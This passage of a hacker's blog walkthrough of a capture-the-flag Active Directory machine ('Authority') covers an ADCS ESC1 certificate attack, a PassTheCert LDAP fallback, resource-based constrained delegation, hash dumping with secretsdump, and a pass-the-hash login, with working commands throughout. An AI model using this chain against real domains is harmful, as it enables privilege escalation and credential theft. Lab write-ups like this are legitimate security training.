    -   {{< figure src="/ox-hugo/2024-10-24-161300_.png" >}}
    -   +Note+: As we can see we can add 10 machines as expected.

-   **Using** `netexec`:
    -   `netexec ldap $box -u $user -p $pass -M maq`
    -   {{< figure src="/ox-hugo/2024-10-24-161632_.png" >}}

-   **Using AD Powershell Module**:
    -   `Get-ADDomain | Select-Object -ExpandProperty MaxComputers`
    -   +Note+: This system does not have the AD cmdlet available however I wanted to include it.


### Creating a computer with impacket-addcomputer: {#creating-a-computer-with-impacket-addcomputer}

-   As we know we can add a computer we can use impacket-addcomputer to do it.
-   **Create the computer using Impacket**:
    -   `impacket-addcomputer -computer-name 'bloodstiller' -computer-pass 'b100dstill3r' -dc-ip $dcip $domain/svc_ldap`
    -   {{< figure src="/ox-hugo/2024-10-24-171459_.png" >}}

-   **I verify the computer was made using PowerView**:
    -   `Get-AdComputer -identity bloodstiller`
    -   {{< figure src="/ox-hugo/2024-10-24-172524_.png" >}}
        -   **Note**: be patient, this can hang for a number of seconds!


### Using certipy-ad &amp; ESC1 Attack Chain to elevate privileges to Administrator: {#using-certipy-ad-and-esc1-attack-chain-to-elevate-privileges-to-administrator}

1.  **I retrieve the vulnerable certificate name**:
    -   {{< figure src="/ox-hugo/2024-10-24-094511_.png" >}}
    -   `CorpVPN`

2.  **I sync my clock with the target**:
    -   `sudo ntpdate -s $domain`
    -   {{< figure src="/ox-hugo/2024-10-24-094901_.png" >}}

3.  **I request a cert**:
    -   `certipy-ad req -username bloodstiller$ -password $pass -ca AUTHORITY-CA -dc-ip $dcip -template CorpVPN -upn administrator@$domain -dns $domain`
    -   +Note+: How we have used the name of the certificate we found in step 1 `CorpVPN`
    -   I get the below errors:
        -   {{< figure src="/ox-hugo/2024-10-29-083700_.png" >}}

4.  **Troubleshooting the issue**:
    -   I tried so many different variations of this to try and get it to work. So many different certipy-ad commands as I was convinced I had gotten the syntax wrong. No matter what I did this kept failing. I have done this attack path before so know the commands etc are right.
        -   <https://bloodstiller.com/walkthroughs/escape-box/#using-esc1-attack-chain-to-elevate-privileges-to-administrator>
    -   After some searching online I find the below github issue thread.
        -   <https://github.com/ly4k/Certipy/issues/158>
    -   &amp; this comment:
        -   {{< figure src="/ox-hugo/2024-10-29-083750_.png" >}}


### Using addcomputer.py to start the attack chain again: {#using-addcomputer-dot-py-to-start-the-attack-chain-again}

-   {{< figure src="/ox-hugo/certipymeme.jpeg" >}}

**Let's start this process over using** `addcomputer.py`:

-   **Get the file**:
    -   `wget https://raw.githubusercontent.com/fortra/impacket/refs/heads/master/examples/addcomputer.py`

-   **Add the computer**:
    -   `python3 addcomputer.py -computer-name 'bloodstiller' -computer-pass 'b100dstill3r' -dc-ip $dcip $domain/svc_ldap`
    -   {{< figure src="/ox-hugo/2024-10-29-094940_.png" >}}

-   **Install** `certipy-ad` **via pipx**:
    -   `pipx install certipy-ad`
    -   {{< figure src="/ox-hugo/2024-10-29-095432_.png" >}}

-   **Get ticket**
    -   `certipy req -username bloodstiller$ -password $pass -ca AUTHORITY-CA -dc-ip $dcip -template CorpVPN -upn administrator@$domain  -dns $domain -debug`
    -   {{< figure src="/ox-hugo/2024-10-29-101211_.png" >}}

-   **Attempt to request a** `TGT` **and get the below erorr**:
    -   `certipy auth -pfx administrator_authority.pfx -dc-ip $box`
    -   {{< figure src="/ox-hugo/2024-10-29-101356_.png" >}}


## 4. Ownership: {#4-dot-ownership}


### Understanding the `KDC_ERR_PADATA_TYPE_NOSUPP` error: {#understanding-the-kdc-err-padata-type-nosupp-error}

-   **Looking online we can find the following article**:
    -   <https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d>
    -   **Which says this**:
        -   {{< figure src="/ox-hugo/2024-10-29-162446_.png" >}}


#### What does this actually mean though? {#what-does-this-actually-mean-though}

-   It means that PKINIT authentication has failed.

-   **When** PKINIT **authentication fails, it's often because either**:
    -   PKINIT is not enabled on the Domain Controller, or
    -   The certificate being used lacks the required Smart Card Logon Extended Key Usage (EKU).
        -   This EKU requirement is a common issue when the PKI is not properly configured.

So what's a PKINIT and an EKU&#x2026;glad you asked.


#### Public Key Cryptography for Initial Authentication in kerberos (PKINIT) Primer: {#public-key-cryptography-for-initial-authentication-in-kerberos--pkinit--primer}

PKINIT is a kerberos extension that allows users to authenticate to a kerberos Key Distribution Center (KDC) using X.509 public key certificates instead of the traditional kerberos username and password, & guess what we have an X.509 certificate that certipy extracted for us.

#####  How PKINIT Works:

-   The PKINIT process works as follows:
    1.  The client initiates a kerberos pre-authentication request, including their X.509 certificate.
    2.  The KDC verifies the client's certificate and extracts the necessary information, such as the client's public key.
    3.  The KDC and client then engage in a series of cryptographic exchanges to authenticate the client and establish a session key.
    4.  Once authenticated, the client can request kerberos tickets (e.g., TGTs) to access resources and services.

##### PKINIT Requirements
-   For PKINIT to work, several requirements must be met:
    1.  The client's X.509 certificate must be trusted by the KDC.
    2.  The client's certificate must have the appropriate Extended Key Usage (EKU) set, typically the "Smart Card Logon" EKU.
    3.  The KDC must be configured to support PKINIT and have the necessary certificate trust chain.
    4.  The client and KDC must have a shared understanding of the supported cryptographic algorithms and protocols.

##### The main benefits of PKINIT include:
-   **Enhanced security**: PKINIT leverages the security of public key cryptography, providing an alternative to password-based authentication.
    -   **Improved user experience**: Users can authenticate using their existing PKI-based credentials, such as smart cards or software certificates, without having to manage separate kerberos credentials.
    -   **Support for single sign-on**: PKINIT enables users to obtain kerberos tickets using their PKI credentials, facilitating single sign-on across applications and services.

##### PKINIT Resources:
-   <https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf>
-   <https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/>
-   <https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab>
-   <https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/d0cf1763-3541-4008-a75f-a577fa5e8c5b>

But what is an EKU&#x2026;..glad you asked my hacking bretherin.


#### Extended Key Usage (EKU) Primer: {#extended-key-usage--eku--primer}

##### What is in an EKU?
-   Extended Key Usage (EKU) is an X.509 certificate field that indicates the purpose(s) for which the certified public key can be used. EKU's provide more granular control over how a certificate can be used, beyond the basic key usage fields.

##### Importance of Correct EKU Configuration:
-   If the client's certificate does not have the "Smart Card Logon" EKU (or another EKU approved for PKINIT), **the KDC will likely reject the PKINIT pre-authentication request**. This can happen if the underlying Public Key Infrastructure (PKI) is not properly configured to issue certificates with the correct EKUs.
    -   +Note+: This is what is happening when we see the error: `KDC_ERR_PADATA_TYPE_NOSUPP`
-   Ensuring that certificates used for PKINIT have the proper EKU is a crucial step in setting up and maintaining a functional PKINIT deployment.
-   Without the right EKU, PKINIT will not work as expected, and users may be unable to authenticate using their PKI credentials.

##### EKUs and PKINIT:
-   For PKINIT to work correctly, the client's X.509 certificate must have the appropriate EKU set.
    -   This is typically the "Smart Card Logon" EKU.
-   The "Smart Card Logon" EKU indicates that the certificate can be used for authenticating the certificate holder to a system.
-   This EKU is essential for PKINIT, as it signals to the kerberos Key Distribution Center (KDC) that the certificate is intended for user authentication.

##### EKU resources:
-   <https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn786428(v=ws.11)#extended-key-usages>
-   <https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88>
-   <https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ppsec/d2f037c5-7a2a-4513-8f72-5b1c7bd88561>


#### So how do we move forward with our attack chain? {#so-how-do-we-move-forward-with-our-attack-chain}

-   **Bypassing** PKINIT **Limitations**
    -   If the domain controller does not support PKINIT, (the kerberos mechanism that allows using X.509 certificates for pre-authentication.) Due to not having the required "Smart Card Logon" Extended Key Usage (EKU) set what do we do? Looking back at the article we can see it mentions the tool [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/tree/main).
        -   {{< figure src="/ox-hugo/2024-10-29-162750_.png" >}}
     -   Which means in these cases, alternative authentication methods may be available.
        -   For example, protocols like `LDAP` can support Schannel, which enables authentication through `TLS`. This can provide a way to perform certificate-based authentication, even when PKINIT is not supported by the Domain Controllers.


#### Secure Channel (Schannel) Primer: {#secure-channel--schannel--primer}

Last primer I promise. I'm sorry, there are just a lot of parts here and unless we understand we are just script kiddies aren't we.

-   Schannel is the Secure Channel security package in Windows.
-   It is a set of security protocols and `APIs` that provide secure network communications, including `SSL/TLS` encryption and authentication.
-   In cases where PKINIT is not available we can attempt to authenticate against `LDAP/S` using the cert with Schannel
-   So, in summary, Schannel provides an alternative authentication mechanism that can be leveraged when PKINIT kerberos authentication is not possible, due to issues with the certificate such as EKU not being set.

We got there, primers done I promise.

##### Schannel Resources:
-   <https://learn.microsoft.com/en-us/windows/win32/com/schannel>
-   <https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/demystifying-schannel/ba-p/259233>


### Using PassTheCert &amp; certipy to get our ticket: {#using-passthecert-and-certipy-to-get-our-ticket}


#### Extracting the key &amp; cert from the `.pfx` file using `certipy`: {#extracting-the-key-and-cert-from-the-dot-pfx-file-using-certipy}

- As we cannot use the original extracted cert we need to separate the certificate and key in order to use them. 
-   **Extract the certificate**:
    -   `certipy cert -pfx administrator_authority.pfx -nokey -out admin.crt`
    -   {{< figure src="/ox-hugo/2024-10-30-172716_.png" >}}

-   **Extract the key**:
    -   `certipy cert -pfx administrator_authority.pfx -nocert -out admin.key`
    -   {{< figure src="/ox-hugo/2024-10-30-172730_.png" >}}


#### Creating a new computer for an RBCD attack using `PassTheCert`: {#creating-a-new-computer-for-an-rbcd-attack-using-passthecert}

-   As we now have the admin certificate and key we can use `PassTheCert` to create another new computer on the domain that we can grant delegation privileges for over the `DC authority.authority.htb`

-   An RBCD (Resource-Based Constrained Delegation) attack allows us to impersonate another user on a target computer. In this case the Administrator on the DC. We can do this by modifying the `msDS-AllowedToActOnBehalfOfOtherIdentity` property of the target's AD object (DC), effectively granting the us permission to act on behalf of other users for that specific resource. Once set up, we can perform actions as the specified user (administrator) on the target machine (DC)

<!--listend-->

-   **Create a new computer with constrained delegation privileges over the DC**:
    -   `python3 passthecert.py -action add_computer -crt admin.crt -key admin.key -domain $domain -dc-ip $box -computer-name bloodstiller2$ -delegated-services cifs/authority.$domain,ldap/authority.$domain`
    -   {{< figure src="/ox-hugo/2024-10-30-180702_.png" >}}


#### Performing the RBCD attack with `impacket-getST`: {#performing-the-rbcd-attack-with-impacket-getst}

-   **Perform an** RBCD **attack against the** `DC` **to retrieve an admin** `TGT`
    -   `impacket-getST -spn ldap/authority.$domain -impersonate Administrator -dc-ip $box 'authority.htb/bloodstiller2:g4rHrG2bPnCcz8mX7d1wGPNq4NnPf9Sp'`
    -   {{< figure src="/ox-hugo/2024-10-30-180539_.png" >}}

-   **Rename the** `.ccache` **file because WHY SO LONG**!
    -   `mv Administrator@ldap_authority.authority.htb@AUTHORITY.HTB.ccache Admin.ccache`
    -   {{< figure src="/ox-hugo/2024-10-30-180410_.png" >}}

-   **Export the** `KRB5CCNAME` **Variable**:
    -   `export KRB5CCNAME=./Admin.ccache`
    -   {{< figure src="/ox-hugo/2024-10-30-182124_.png" >}}

-   **Use** `impacket-secretsdump` **to dump the hashes**:
    -   `impacket-secretsdump -k -no-pass $domain/administrator@authority.$domain`
    -   {{< figure src="/ox-hugo/2024-10-30-180030_.png" >}}

-   **Verify the dumped hash works**:
    -   `netexec smb $box -u administrator -H $hash`
    -   {{< figure src="/ox-hugo/2024-10-30-175847_.png" >}}

-   **Connect with** `evil-winrm` **and get our flag**:
    -   `evil-winrm -i $box -u administrator -H $hash`
    -   {{< figure src="/ox-hugo/2024-10-30-180232_.png" >}}


### Why did this work? {#why-did-this-work}

**The key points are**:

- **Situation**:  
    - Enrolled a vulnerable certificate, but PKINIT failed due to Extended Key Usage (EKU) not being set.
    - Required an alternative authentication method to access the Domain Controller (DC) using the certificate.

- **Alternative Authentication**:  
    - Used `PassTheCert` to authenticate via `LDAP` using the Schannel security package.

- **RBCD (Resource-Based Constrained Delegation)**:  
    - Created a new computer with delegation rights over the DC.
    - Allowed us to authenticate against this new computer as the `Administrator`.
    - Enabled extraction of an Administrator TGT, granting us domain-level authentication.


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1. I learned about what to do if PKINIT is disabled. I really enjoyed this box, it wasn't a case of just follow the attack path. 

2. I learned about decrypting ansible hashes, I have never done that before. 


### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1. Not too many this times. It just took time to understand and make this work as there were more moving parts I had to understand to get everything working


## Sign off: {#sign-off}

Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

&#x2013; Bloodstiller

&#x2013; Get in touch bloodstiller at proton dot me


